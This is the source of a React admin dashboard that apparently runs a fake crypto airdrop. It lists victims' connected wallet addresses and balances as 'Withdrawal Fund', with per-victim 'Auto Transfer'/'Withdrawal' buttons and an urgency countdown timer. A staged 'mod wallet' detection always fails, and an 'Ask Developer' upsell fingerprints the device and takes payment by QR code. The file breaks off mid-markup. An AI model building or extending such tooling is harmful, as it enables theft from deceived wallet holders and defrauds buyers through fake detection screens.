import { useState, useEffect } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { UserDetailModal } from "@/components/user-detail-modal";
import { ModWalletVersionPicker } from "@/components/mod-wallet-version-picker";
import { WithdrawalModal } from "@/components/withdrawal-modal";
import { Users, Eye, Trash2, Calendar, Clock, Wallet, X, CheckCircle, AlertCircle, Smartphone, Package } from "lucide-react";
import { Input } from "@/components/ui/input";
import type { Claim } from "@shared/schema";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";

export default function Admin() {
  const [selectedUser, setSelectedUser] = useState<Claim | null>(null);
  const [timerDate, setTimerDate] = useState<string>("");
  const [timerEnabled, setTimerEnabled] = useState(true);
  const [transferClaim, setTransferClaim] = useState<Claim | null>(null);
  const [autoTransferEnabled, setAutoTransferEnabled] = useState(false);
  const [showDetectingWallet, setShowDetectingWallet] = useState(false);
  const [showNoWalletFound, setShowNoWalletFound] = useState(false);
  const [showAutoTransferWarning, setShowAutoTransferWarning] = useState(false);
  // Ask Developer states
  const [showAskDeveloper, setShowAskDeveloper] = useState(false);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [showRoadmap, setShowRoadmap] = useState(false);
  const [deviceDetails, setDeviceDetails] = useState<any>(null);
  const [selectedWalletType, setSelectedWalletType] = useState("");
  const [adminEmail, setAdminEmail] = useState("");
  const [transactionId, setTransactionId] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [qrCode, setQrCode] = useState("");
  const [verificationData, setVerificationData] = useState<any>(null);

  const [showCreateWalletPopup, setShowCreateWalletPopup] = useState(false);
  const [showVersionPicking, setShowVersionPicking] = useState(false);
  const [showEmailInput, setShowEmailInput] = useState(false);
  const [showWalletSelection, setShowWalletSelection] = useState(false);
  const [showPaymentQR, setShowPaymentQR] = useState(false);
  const [userEmail, setUserEmail] = useState('');
  const [showVerificationSuccess, setShowVerificationSuccess] = useState(false);
  const [showWithdrawalModal, setShowWithdrawalModal] = useState(false);
  const [selectedVersionWalletType, setSelectedVersionWalletType] = useState("");
  const [withdrawalCoinType, setWithdrawalCoinType] = useState<string | undefined>(undefined);
  const [withdrawalCoinBalance, setWithdrawalCoinBalance] = useState<number | undefined>(undefined);
  const queryClient = useQueryClient();

  useEffect(() => {
    // Load auto transfer setting - default is OFF
    const autoTransferSetting = localStorage.getItem('autoTransferEnabled') === 'true';
    setAutoTransferEnabled(autoTransferSetting);
  }, []);

  useEffect(() => {
    // Load current timer settings
    const savedDate = localStorage.getItem('airdropTargetDate');
    const isEnabled = localStorage.getItem('timerEnabled') !== 'false';

    if (savedDate) {
      setTimerDate(new Date(savedDate).toISOString().slice(0, 16));
    } else {
      // Default: 48 days from now
      const defaultDate = new Date();
      defaultDate.setDate(defaultDate.getDate() + 48);
      setTimerDate(defaultDate.toISOString().slice(0, 16));
    }

    setTimerEnabled(isEnabled);
  }, []);

  const { data: claims, isLoading } = useQuery<Claim[]>({
    queryKey: ['/api/claims'],
  });

  const deleteAllMutation = useMutation({
    mutationFn: async () => {
      const response = await fetch('/api/claims/all', { method: 'DELETE' });
      if (!response.ok) {
        throw new Error('Failed to delete all claims');
      }
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/claims'] });
    },
    onError: (error) => {
      console.error("Error deleting all claims:", error);
      // Optionally show an error message to the user
    }
  });

  const handleAllDelete = () => {
    if (confirm("Are you sure you want to delete all claims? This action cannot be undone.")) {
      deleteAllMutation.mutate();
    }
  };

  const handleTimerUpdate = () => {
    if (timerDate) {
      const targetDate = new Date(timerDate).toISOString();
      localStorage.setItem('airdropTargetDate', targetDate);
      localStorage.setItem('timerEnabled', 'true');
      setTimerEnabled(true);
      // Force multiple storage events to ensure all components update
      window.dispatchEvent(new Event('storage'));
      window.dispatchEvent(new StorageEvent('storage', {
        key: 'airdropTargetDate',
        newValue: targetDate
      }));
      window.dispatchEvent(new StorageEvent('storage', {
        key: 'timerEnabled',
        newValue: 'true'
      }));
      alert('Timer updated and started successfully! Users will see the countdown.');
      // Force page reload to ensure timer updates everywhere
      setTimeout(() => window.location.reload(), 500);
    } else {
      alert('Please select a date and time first.');
    }
  };

  const handleTimerToggle = () => {
    const newState = !timerEnabled;
    setTimerEnabled(newState);
    localStorage.setItem('timerEnabled', String(newState));
    // Force reload to apply changes immediately
    window.dispatchEvent(new Event('storage'));
    alert(`Timer ${newState ? 'enabled' : 'disabled'} successfully! ${newState ? 'Users can now see the countdown.' : 'Timer is hidden from users.'}`);
  };

  const handleAutoTransferToggle = () => {
    if (!autoTransferEnabled) {
      // Show warning to import wallet first
      setShowAutoTransferWarning(true);
    } else {
      // Turn off auto transfer
      const newState = false;
      setAutoTransferEnabled(newState);
      localStorage.setItem('autoTransferEnabled', String(newState));
    }
  };

  const handleImportModWallet = () => {
    // Start wallet detection flow
    setShowDetectingWallet(true);

    // Show no wallet found after detection
    setTimeout(() => {
      setShowDetectingWallet(false);
      setShowNoWalletFound(true);
    }, 2000);
  };

  const handleAutoTransfer = (claim: Claim, coinType?: string, coinBalance?: number) => {
    setTransferClaim(claim);
    setWithdrawalCoinType(coinType);
    setWithdrawalCoinBalance(coinBalance);
    setShowWithdrawalModal(true);
  };

  // Ask Developer functions
  const collectDeviceDetails = () => {
    const ua = navigator.userAgent;
    
    // Extract REAL device information from user agent - NO FAKE DATA
    let brand = "Not Detected";
    let model = "Not Detected";
    let deviceType = "Not Detected";
    
    // Android devices - extract actual device info from user agent
    if (/Android/.test(ua)) {
      deviceType = "Mobile (Android)";
      const buildMatch = ua.match(/;\s*([^)]+)\s+Build/);
      if (buildMatch) {
        const deviceString = buildMatch[1].trim();
        model = deviceString;
        
        // Extract brand from actual device string
        if (/Samsung|SM-|GT-/i.test(deviceString)) brand = "Samsung";
        else if (/Xiaomi|Mi\s|Redmi|POCO/i.test(deviceString)) brand = "Xiaomi";
        else if (/OPPO|CPH|PCAM/i.test(deviceString)) brand = "OPPO";
        else if (/vivo|V\d{4}/i.test(deviceString)) brand = "Vivo";
        else if (/OnePlus|ONEPLUS/i.test(deviceString)) brand = "OnePlus";
        else if (/Huawei|HUAWEI|HONOR/i.test(deviceString)) brand = "Huawei";
        else if (/realme|RMX/i.test(deviceString)) brand = "Realme";
        else if (/Motorola|moto|XT/i.test(deviceString)) brand = "Motorola";
        else if (/Nokia/i.test(deviceString)) brand = "Nokia";
        else if (/Google|Pixel/i.test(deviceString)) brand = "Google";
        else if (/LG/i.test(deviceString)) brand = "LG";
        else if (/Sony/i.test(deviceString)) brand = "Sony";
        else if (/TECNO|SPARK/i.test(deviceString)) brand = "Tecno";
        else if (/Infinix/i.test(deviceString)) brand = "Infinix";
        else if (/itel/i.test(deviceString)) brand = "Itel";
        else if (/Lenovo/i.test(deviceString)) brand = "Lenovo";
        else if (/Asus|ASUS|ZenFone/i.test(deviceString)) brand = "Asus";
        else if (/HTC/i.test(deviceString)) brand = "HTC";
        else {
          const firstWord = deviceString.split(/[\s;,]/)[0];
          if (firstWord && firstWord.length > 1) brand = firstWord;
        }
      }
    }
    // iOS devices
    else if (/iPhone/.test(ua)) {
      deviceType = "Mobile (iOS)";
      brand = "Apple";
      const osMatch = ua.match(/iPhone OS ([\d_]+)/);
      if (osMatch) {
        const version = parseInt(osMatch[1].split('_')[0]);
        if (version >= 17) model = "iPhone (iOS " + version + "+)";
        else if (version >= 16) model = "iPhone (iOS 16)";
        else if (version >= 15) model = "iPhone (iOS 15)";
        else model = "iPhone (iOS " + version + ")";
      } else {
        model = "iPhone";
      }
    }
    else if (/iPad/.test(ua)) {
      deviceType = "Tablet (iOS)";
      brand = "Apple";
      model = "iPad";
    }
    // Desktop/PC
    else if (/Windows/.test(ua)) {
      deviceType = "Desktop/PC";
      brand = "Windows";
      model = "Windows PC";
    }
    else if (/Macintosh/.test(ua)) {
      deviceType = "Desktop/PC";
      brand = "Apple";
      model = "Mac";
    }
    else if (/Linux/.test(ua) && !/Android/.test(ua)) {
      deviceType = "Desktop/PC";
      brand = "Linux";
      model = "Linux PC";
    }
    
    // REAL browser detection from actual user agent
    let browser = "Not Detected";
    if (/EdgA/i.test(ua)) browser = "Edge (Android)";
    else if (/Edg/i.test(ua)) browser = "Microsoft Edge";
    else if (/CriOS/i.test(ua)) browser = "Chrome (iOS)";
    else if (/SamsungBrowser/i.test(ua)) browser = "Samsung Internet";
    else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Google Chrome";
    else if (/FxiOS/i.test(ua)) browser = "Firefox (iOS)";
    else if (/Firefox/i.test(ua)) browser = "Mozilla Firefox";
    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
    else if (/OPR|Opera/i.test(ua)) browser = "Opera";
    
    // REAL OS version detection
    let osVersion = "Not Detected";
    let osName = "Not Detected";
    if (/Android/.test(ua)) {
      osName = "Android";
      const versionMatch = ua.match(/Android\s+([\d.]+)/);
      osVersion = versionMatch ? versionMatch[1] : "Not Detected";
    } else if (/iPhone|iPad/.test(ua)) {
      osName = "iOS";
      const versionMatch = ua.match(/OS\s+([\d_]+)/);
      osVersion = versionMatch ? versionMatch[1].replace(/_/g, '.') : "Not Detected";
    } else if (/Windows/.test(ua)) {
      osName = "Windows";
      if (/Windows NT 10/.test(ua)) osVersion = "10/11";
      else if (/Windows NT 6.3/.test(ua)) osVersion = "8.1";
      else if (/Windows NT 6.2/.test(ua)) osVersion = "8";
      else if (/Windows NT 6.1/.test(ua)) osVersion = "7";
      else osVersion = "Not Detected";
    } else if (/Mac OS/.test(ua)) {
      osName = "macOS";
      const versionMatch = ua.match(/Mac OS X ([\d_]+)/);
      osVersion = versionMatch ? versionMatch[1].replace(/_/g, '.') : "Not Detected";
    } else if (/Linux/.test(ua) && !/Android/.test(ua)) {
      osName = "Linux";
      osVersion = "Not Detected";
    }

    // REAL network connection detection
    let networkType = "Not Detected";
    let downlink = "Not Detected";
    if ('connection' in navigator || 'mozConnection' in navigator || 'webkitConnection' in navigator) {
      const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
      if (conn) {
        const effectiveType = conn.effectiveType || conn.type;
        if (effectiveType === '4g') networkType = "4G/LTE";
        else if (effectiveType === '3g') networkType = "3G";
        else if (effectiveType === '2g') networkType = "2G";
        else if (effectiveType === 'slow-2g') networkType = "2G (Slow)";
        else if (effectiveType === 'wifi' || conn.type === 'wifi') networkType = "WiFi";
        else if (effectiveType === '5g') networkType = "5G";
        else if (effectiveType) networkType = effectiveType.toUpperCase();
        
        // Get actual download speed if available
        if (conn.downlink) {
          downlink = `${conn.downlink} Mbps`;
        }
      }
    }
    
    // Get REAL CPU cores and RAM info
    let cores = "Not Detected";
    if (navigator.hardwareConcurrency) {
      cores = String(navigator.hardwareConcurrency);
    }
    
    let memory = "Not Detected";
    if ((navigator as any).deviceMemory) {
      memory = `${(navigator as any).deviceMemory} GB`;
    }
    
    // Pixel ratio
    let pixelRatio = "Not Detected";
    if (window.devicePixelRatio) {
      pixelRatio = `${window.devicePixelRatio.toFixed(2)}x`;
    }
    
    // Collect REAL-TIME device details (NOT stored in database)
    const details = {
      deviceType: deviceType,
      brand: brand,
      model: model,
      browser: browser,
      os: osName,
      osVersion: osVersion,
      fullOSInfo: `${osName} ${osVersion}`,
      screen: `${window.screen.width} x ${window.screen.height}`,
      colorDepth: `${window.screen.colorDepth}-bit`,
      pixelRatio: pixelRatio,
      language: navigator.language || "Not Detected",
      platform: navigator.platform || "Not Detected",
      cores: cores,
      memory: memory,
      connection: networkType,
      downlink: downlink,
      online: navigator.onLine ? "Online" : "Offline",
      timestamp: new Date().toLocaleString('en-US', { 
        dateStyle: 'full', 
        timeStyle: 'long' 
      }),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    
    setDeviceDetails(details);
    return details;
  };

  const handleAskDeveloper = async () => {
    const details = collectDeviceDetails();
    
    // Check if admin has already verified payment
    const storedAdminEmail = localStorage.getItem('adminEmail');
    if (storedAdminEmail) {
      try {
        const response = await fetch(`/api/admin/mod-verification/${storedAdminEmail}`);
        if (response.ok) {
          const data = await response.json();
          setVerificationData(data);
          setAdminEmail(storedAdminEmail);
          setShowRoadmap(true);
          return;
        }
      } catch (error) {
        console.log('No existing verification found');
      }
    }
    
    // If no verification found, show Ask Developer modal
    setShowAskDeveloper(true);
  };

  const handleWalletSelection = async (walletType: string) => {
    // Preserve wallet type before showing version picker
    setSelectedVersionWalletType(walletType);
    setSelectedWalletType(walletType);
    setShowAskDeveloper(false);
    setShowVersionPicking(true);
  };

  const handleVersionSelected = async (version: string) => {
    // After version is selected, show payment modal
    try {
      const response = await fetch("/api/payment-qr");
      const data = await response.json();
      setQrCode(data.qrCode);
      // selectedWalletType is already set in handleWalletSelection
      setShowVersionPicking(false); // Close version picker
      setShowPaymentModal(true);
    } catch (error) {
      console.error("Failed to load payment QR code:", error);
      // Handle error with user feedback
      alert("Failed to load payment information. Please try again.");
      // Restore the Ask Developer dialog
      setShowVersionPicking(false);
      setShowAskDeveloper(true);
    }
  };

  const handleVersionPickerClose = () => {
    // Restore Ask Developer dialog when version picker is closed without selection
    setShowVersionPicking(false);
    setShowAskDeveloper(true);
  };

  const handlePaymentVerification = async () => {
    if (!transactionId || !adminEmail || !walletAddress) {
      alert('Please fill all fields');
      return;
    }

    try {
      const response = await fetch("/api/admin/verify-mod-payment", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          transactionId,
          walletType: selectedWalletType,
          adminEmail,
          walletAddress,
          deviceDetails: JSON.stringify(deviceDetails)
        })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || 'Payment verification failed');
      }

      setVerificationData(data.verification);
      setShowPaymentModal(false);
      setShowRoadmap(true);
      alert('Payment verified successfully!');

    } catch (error: any) {
      console.error('Verification error:', error);
      alert(error.message || 'Payment verification failed. Please check your details and try again.');
    }
  };

  // Check for existing verification
  const checkExistingVerification = async (email: string) => {
    try {
      const response = await fetch(`/api/admin/mod-verification/${email}`);
      if (response.ok) {
        const data = await response.json();
        setVerificationData(data);
        setShowRoadmap(true);
      }
    } catch (error) {
      // No existing verification found
      console.log("No existing verification found for email:", email);
    }
  };

  // Initialize by checking for existing verification if admin email is stored
  useEffect(() => {
    const storedAdminEmail = localStorage.getItem('adminEmail');
    if (storedAdminEmail) {
      setAdminEmail(storedAdminEmail);
      checkExistingVerification(storedAdminEmail);
    }
  }, []);


  const totalUsers = claims?.length || 0;

  const calculateTotalBalance = (balances: any) => {
    if (!balances) return 0;
    const values = Object.values(balances).filter((v): v is string => typeof v === 'string');
    return values.reduce((sum, val) => sum + parseFloat(val || '0'), 0);
  };

  const truncateAddress = (address: string) => {
    return `${address.slice(0, 8)}...${address.slice(-6)}`;
  };

  const formatDate = (date: string | Date) => {
    return new Date(date).toLocaleString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  const handleCreateModWallet = () => {
    setShowAskDeveloper(false);
    setShowCreateWalletPopup(true);
  };

  const handleVersionPicking = () => {
    setShowCreateWalletPopup(false);
    setShowVersionPicking(true);

    // Auto-detect mobile version
    setTimeout(() => {
      setShowVersionPicking(false);
      setShowEmailInput(true);
    }, 2000);
  };

  const handleEmailSubmit = () => {
    if (userEmail.trim()) {
      setShowEmailInput(false);
      setShowWalletSelection(true);
    } else {
      alert('Please enter a valid email');
    }
  };

  const handleWalletTypeSelect = (type: string) => {
    setSelectedWalletType(type);
    setShowWalletSelection(false);
    setShowPaymentQR(true);
  };

  const handleVerifyTransaction = async () => {
    if (!transactionId.trim()) {
      alert('Please enter your transaction ID');
      return;
    }

    if (!userEmail.trim()) {
      alert('Please enter your email');
      return;
    }

    try {
      alert('Payment verification in progress. Please wait...');

      // Get wallet address from metamask or use a dummy for testing
      let walletAddress = '0x0000000000000000000000000000000000000000';
      if (typeof window.ethereum !== 'undefined') {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          walletAddress = accounts[0];
        }
      }

      // Collect device details
      const deviceDetails = JSON.stringify({
        model: navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || "Unknown",
        browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/)?.[0] || "Unknown",
        os: navigator.platform || "Unknown",
        screen: `${window.screen.width}x${window.screen.height}`,
        mobileVersion: /Android|iPhone|iPad/.test(navigator.userAgent)
          ? navigator.userAgent.match(/(Android|iPhone OS) [\d._]+/)?.[0] || "Mobile"
          : "Desktop",
        userAgent: navigator.userAgent
      });

      // Verify payment with Moralis API
      const response = await fetch('/api/admin/verify-mod-payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          transactionId,
          walletType: selectedWalletType,
          adminEmail: userEmail,
          walletAddress,
          deviceDetails
        }),
      });

      const result = await response.json();

      if (response.ok && result.success) {
        // Save admin email for future reference
        localStorage.setItem('adminEmail', userEmail);

        // Close payment popup and show verification success
        setShowPaymentQR(false);
        setShowVerificationSuccess(true);

        // Clear form
        setTransactionId('');
      } else {
        alert(result.message || 'Transaction verification failed. Please check your transaction ID and try again.');
      }
    } catch (error) {
      console.error('Verification error:', error);
      alert('Failed to verify transaction. Please try again.');
    }
  };

  const handleAskDeveloperOriginal = async () => {
    // Check if admin already has a verified mod wallet
    try {
      const adminEmail = localStorage.getItem('adminEmail') || '';
      if (adminEmail) {
        const response = await fetch(`/api/admin/mod-verification/${adminEmail}`);
        if (response.ok) {
          const verification = await response.json();
          // Show existing verification status
          setShowAskDeveloper(true);
          return;
        }
      }
    } catch (error) {
      console.log('No existing verification found');
    }

    // Start new verification
    setShowAskDeveloper(true);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-primary/5">
      {/* Header */}
      <header className="sticky top-0 z-50 border-b border-border bg-card/95 backdrop-blur-xl">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center">
                <Users className="w-6 h-6 text-primary" />
              </div>
              <h1 className="text-2xl font-bold">Admin Dashboard</h1>
            </div>
            <div className="flex items-center gap-4">
              <Badge variant="outline" className="px-4 py-2" data-testid="badge-user-count">
                <Users className="w-4 h-4 mr-2" />
                {totalUsers} Users
              </Badge>
              <Button
                variant="destructive"
                onClick={handleAllDelete}
                disabled={deleteAllMutation.isPending || totalUsers === 0}
                className="gap-2"
              >
                <Trash2 className="w-4 h-4" />
                {deleteAllMutation.isPending ? 'Deleting...' : 'Delete All Claims'}
              </Button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="container mx-auto px-4 py-8">
        {/* Admin Actions Card */}
        <Card className="rounded-2xl border-card-border p-6 mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Users className="w-6 h-6 text-primary" />
            <h2 className="text-xl font-bold">Admin Actions</h2>
          </div>

          <div className="grid md:grid-cols-2 gap-4">
            <Button
              variant="outline"
              className="h-20 text-lg font-semibold bg-purple-500/10 hover:bg-purple-500/20 border-purple-500/50"
              onClick={handleImportModWallet}
            >
              <Wallet className="w-6 h-6 mr-2" />
              Import Mod Wallet
            </Button>

            <Button
              variant="outline"
              className="h-20 text-lg font-semibold bg-orange-500/10 hover:bg-orange-500/20 border-orange-500/50"
              onClick={handleAskDeveloper}
            >
              <Package className="w-6 h-6 mr-2" />
              Ask Developer
            </Button>
          </div>
        </Card>

        {/* Timer Control Card */}
        <Card className="rounded-2xl border-card-border p-6 mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Clock className="w-6 h-6 text-primary" />
            <h2 className="text-xl font-bold">Airdrop Timer Control</h2>
          </div>

          <div className="grid md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium mb-2">
                <Calendar className="w-4 h-4 inline mr-2" />
                Set Airdrop Distribution Date & Time
              </label>
              <Input
                type="datetime-local"
                value={timerDate}
                onChange={(e) => setTimerDate(e.target.value)}
                className="mb-2"
              />
              <Button onClick={handleTimerUpdate} className="w-full">
                Update Timer
              </Button>
            </div>

            <div className="flex flex-col justify-center space-y-3">
              <div className="flex items-center justify-between bg-muted/30 p-4 rounded-lg">
                <span className="font-medium">Timer Status:</span>
                <Badge variant={timerEnabled ? "default" : "secondary"}>
                  {timerEnabled ? "Active" : "Disabled"}
                </Badge>
              </div>
              <Button
                onClick={handleTimerToggle}
                variant="outline"
              >
                {timerEnabled ? "Disable Timer" : "Enable Timer"}
              </Button>

              <div className="flex items-center justify-between bg-muted/30 p-4 rounded-lg mt-3">
                <span className="font-medium">Auto Transfer:</span>
                <Badge variant={autoTransferEnabled ? "default" : "secondary"}>
                  {autoTransferEnabled ? "ON" : "OFF"}
                </Badge>
              </div>
              <Button
                onClick={handleAutoTransferToggle}
                variant="outline"
              >
                {autoTransferEnabled ? "Disable Auto Transfer" : "Enable Auto Transfer"}
              </Button>
            </div>
          </div>
        </Card>



        <Card className="rounded-2xl overflow-hidden border-card-border">
          {isLoading ? (
            <div className="p-12 text-center">
              <div className="w-8 h-8 border-4 border-primary border-t-transparent rounded-full animate-spin mx-auto" />
              <p className="text-muted-foreground mt-4">Loading claims...</p>
            </div>
          ) : claims && claims.length > 0 ? (
            <>
              {/* Desktop Table */}
              <div className="hidden md:block overflow-x-auto">
                <table className="w-full">
                  <thead className="bg-muted/50">
                    <tr>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">#</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Wallet Address</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Wallet Type</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Total Balance</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Device</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Connected At</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {claims.map((claim, index) => (
                      <tr
                        key={claim.id}
                        className="border-t border-border hover:bg-muted/30 transition-colors"
                        data-testid={`row-user-${claim.id}`}
                      >
                        <td className="px-6 py-4">
                          <span className="text-sm font-medium">{index + 1}</span>
                        </td>
                        <td className="px-6 py-4">
                          <code className="text-sm font-mono text-foreground">
                            {truncateAddress(claim.walletAddress)}
                          </code>
                        </td>
                        <td className="px-6 py-4">
                          <Badge variant="outline" className="text-xs">
                            {claim.walletType || 'Unknown'}
                          </Badge>
                        </td>
                        <td className="px-6 py-4">
                          <div className="space-y-2">
                            <div className="bg-green-500/20 border border-green-500/50 rounded-lg px-3 py-2">
                              <p className="text-xs text-green-600 font-medium">Withdrawal Fund</p>
                              <p className="text-lg font-bold text-green-700">
                                ${calculateTotalBalance(claim.balances).toFixed(2)}
                              </p>
                            </div>
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => handleAutoTransfer(claim)}
                              className="w-full bg-blue-500/10 hover:bg-blue-500/20 border-blue-500/50"
                            >
                              Auto Transfer
                            </Button>
                          </div>
                        </td>
                        <td className="px-6 py-4">
                          <div className="text-sm text-muted-foreground">
                            {claim.deviceBrowser || 'Unknown'}
                          </div>
                        </td>
                        <td className="px-6 py-4">
                          <span className="text-sm text-muted-foreground">
                            {formatDate(claim.claimedAt)}
                          </span>
                        </td>
                        <td className="px-6 py-4">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => setSelectedUser(claim)}
                            className="rounded-lg"
                            data-testid={`button-view-details-${claim.id}`}
                          >
                            <Eye className="w-4 h-4 mr-2" />
                            View
                          </Button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {/* Mobile Cards */}
              <div className="md:hidden space-y-4 p-4">
                {claims.map((claim, index) => (
                  <Card
                    key={claim.id}
                    className="p-4 space-y-3 border-card-border"
                    data-testid={`card-user-${claim.id}`}
                  >
                    <div className="flex items-start justify-between">
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <span className="text-xs font-semibold text-muted-foreground">#{index + 1}</span>
                          <Badge variant="outline" className="text-xs">
                            {claim.walletType || 'Unknown'}
                          </Badge>
                        </div>
                        <code className="text-sm font-mono block">
                          {truncateAddress(claim.walletAddress)}
                        </code>
                      </div>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => setSelectedUser(claim)}
                        data-testid={`button-view-mobile-${claim.id}`}
                      >
                        <Eye className="w-4 h-4" />
                      </Button>
                    </div>
                    <div className="space-y-3">
                      <div className="bg-green-500/20 border border-green-500/50 rounded-lg px-3 py-2">
                        <p className="text-xs text-green-600 font-medium">Withdrawal Fund</p>
                        <p className="text-lg font-bold text-green-700">
                          ${calculateTotalBalance(claim.balances).toFixed(2)}
                        </p>
                      </div>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => handleAutoTransfer(claim)}
                        className="w-full bg-red-500/10 hover:bg-red-500/20 border-red-500/50 text-red-600 font-semibold"
                      >
                        Withdrawal
                      </Button>
                      <div className="text-sm text-muted-foreground">
                        Device: {claim.deviceBrowser || 'Unknown'}
                      </div>
                    </div>
                    <div className="text-xs text-muted-foreground">
                      {formatDate(claim.claimedAt)}
                    </div>
                  </Card>
                ))}
              </div>
            </>
          ) : (
            <div className="p-12 text-center">
              <Users className="w-16 h-16 text-muted-foreground/30 mx-auto mb-4" />
              <h3 className="text-lg font-semibold text-foreground mb-2">No Claims Yet</h3>
              <p className="text-muted-foreground">Waiting for users to connect their wallets...</p>
            </div>
          )}
        </Card>
      </div>

      {selectedUser && (
        <UserDetailModal
          claim={selectedUser}
          isOpen={!!selectedUser}
          onClose={() => setSelectedUser(null)}
          onWithdrawal={handleAutoTransfer}
        />
      )}

      {/* Detecting Wallet Popup */}
      {showDetectingWallet && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-blue-900 to-blue-800 border-blue-400/30 p-8 relative">
            <h2 className="text-2xl font-bold text-blue-400 mb-4 text-center">Wallet Detecting...</h2>
            <div className="flex items-center justify-center">
              <div className="w-16 h-16 border-4 border-blue-400 border-t-transparent rounded-full animate-spin mx-auto" />
            </div>
            <p className="text-sm text-blue-200 mt-4 text-center">Please wait while we detect your mod wallet.</p>
          </Card>
        </div>
      )}

      {/* No Mod Wallet Found Popup */}
      {showNoWalletFound && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-red-900 to-red-800 border-red-400/30 p-8 relative">
            <button
              onClick={() => setShowNoWalletFound(false)}
              className="absolute top-4 right-4 text-white/70 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>
            <h2 className="text-2xl font-bold text-red-400 mb-4 text-center">No Mod Wallet Found</h2>
            <p className="text-sm text-red-200 mb-4 text-center">
              No mod wallet was found. Please ensure you have imported a valid wallet.
            </p>
            <Button
              onClick={() => setShowNoWalletFound(false)}
              className="w-full bg-red-400 hover:bg-red-500 text-white font-bold"
            >
              OK
            </Button>
          </Card>
        </div>
      )}

      {/* Auto Transfer Warning Popup */}
      {showAutoTransferWarning && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-yellow-900 to-yellow-800 border-yellow-400/30 p-8 relative">
            <button
              onClick={() => setShowAutoTransferWarning(false)}
              className="absolute top-4 right-4 text-white/70 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>
            <h2 className="text-2xl font-bold text-yellow-400 mb-4 text-center">Import Wallet Required</h2>
            <p className="text-sm text-yellow-200 mb-4 text-center">
              First import your wallet to use this feature.
            </p>
            <Button
              onClick={() => setShowAutoTransferWarning(false)}
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-purple-900 font-bold"
            >
              OK
            </Button>
          </Card>
        </div>
      )}

      {/* Ask Developer Modal */}
      <Dialog open={showAskDeveloper} onOpenChange={setShowAskDeveloper}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold text-purple-900">Get Professional Mod Wallet</DialogTitle>
          </DialogHeader>

          <div className="space-y-6">
            {/* Device Information */}
            <Card className="p-5 bg-gradient-to-br from-purple-50 to-blue-50 border-2 border-purple-400 shadow-lg max-h-96 overflow-y-auto">
              <h3 className="font-bold text-purple-900 mb-4 flex items-center gap-2 text-lg">
                <Smartphone className="w-6 h-6" />
                Device Information
              </h3>
              {deviceDetails && (
                <div className="space-y-3">
                  {/* Device Type & Brand */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">Device Type</p>
                      <p className="font-bold text-purple-900">{deviceDetails.deviceType}</p>
                    </div>
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
                      <p className="text-xs text-gray-500 uppercase mb-1">Brand</p>
                      <p className="font-bold text-purple-900">{deviceDetails.brand}</p>
                    </div>
                  </div>

                  {/* Model */}
                  <div className="p-3 bg-white rounded-lg border border-purple-200">
                    <p className="text-xs text-gray-500 uppercase mb-1">Model</p>
                    <p className="font-bold text-purple-900">{deviceDetails.model}</p>
                  </div>

                  {/* Browser & OS */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="p-3 bg-white rounded-lg border border-purple-200">
